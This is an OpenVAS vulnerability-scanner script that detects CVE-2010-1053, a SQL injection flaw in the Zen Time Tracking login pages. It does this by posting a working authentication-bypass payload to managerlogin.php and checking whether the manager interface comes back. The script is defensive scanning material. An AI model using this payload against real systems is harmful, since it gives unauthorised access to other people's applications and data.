###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_zen_time_tracking_mult_sql_inj_vuln.nasl 13660 2019-02-14 09:48:45Z cfischer $
#
# Zen Time Tracking multiple SQL Injection vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800748");
  script_version("$Revision: 13660 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 10:48:45 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2010-04-06 08:47:09 +0200 (Tue, 06 Apr 2010)");
  script_bugtraq_id(38153);
  script_cve_id("CVE-2010-1053");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_name("Zen Time Tracking multiple SQL Injection vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/38471");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/56146");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/11345");

  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation could allow the attacker to view, add,
  modify or delete information in the underlying database.");

  script_tag(name:"affected", value:"Zen Time Tracking version 2.2 and prior.");

  script_tag(name:"insight", value:"Inputs passed to 'username' and 'password' parameters in
  'userlogin.php' and 'managerlogin.php' are not properly sanitised before
  using it in an sql query, when 'magic_quotes_gpc' is disabled.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"The host is running Zen Time Tracking and is prone to multiple
  SQL Injection vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

zenPort = get_http_port(default:80);
if(!can_host_php(port:zenPort))
  exit(0);

host = http_host_name(port:zenPort);

foreach path (make_list_unique("/", "/ZenTimeTracking", "/zentimetracking", cgi_dirs(port:zenPort)))
{

  if(path == "/") path = "";

  rcvRes = http_get_cache(item: path + "/index.php", port:zenPort);

  if("Zen Time Tracking" >< rcvRes)
  {
    useragent = http_get_user_agent();
    filename = string(path + "/managerlogin.php");
    authVariables = "username=' or' 1=1&password=' or' 1=1";

    sndReq2 = string( "POST ", filename, " HTTP/1.1\r\n",
                      "Host: ", host, "\r\n",
                      "User-Agent: ", useragent, "\r\n",
                      "Accept: text/html,application/xhtml+xml\r\n",
                      "Accept-Language: en-us,en;q=0.5\r\n",
                      "Accept-Encoding: gzip,deflate\r\n",
                      "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n",
                      "Keep-Alive: 300\r\n",
                      "Connection: keep-alive\r\n",
                      "Referer: http://", host, filename, "\r\n",
                      "Cookie: PHPSESSID=bfc4433ae91a4bfe3f70ee900c50d39b\r\n",
                      "Content-Type: application/x-www-form-urlencoded\r\n",
                      "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                       authVariables);
    rcvRes2 = http_keepalive_send_recv(port:zenPort, data:sndReq2);

    if("Create Group" >< rcvRes2 && "Assign Group"  >< rcvRes2 &&
       "Log Off" >< rcvRes2)
    {
      report = report_vuln_url(port:zenPort, url:filename);
      security_message(port:zenPort, data:report);
      exit(0);
    }
  }
}

exit(99);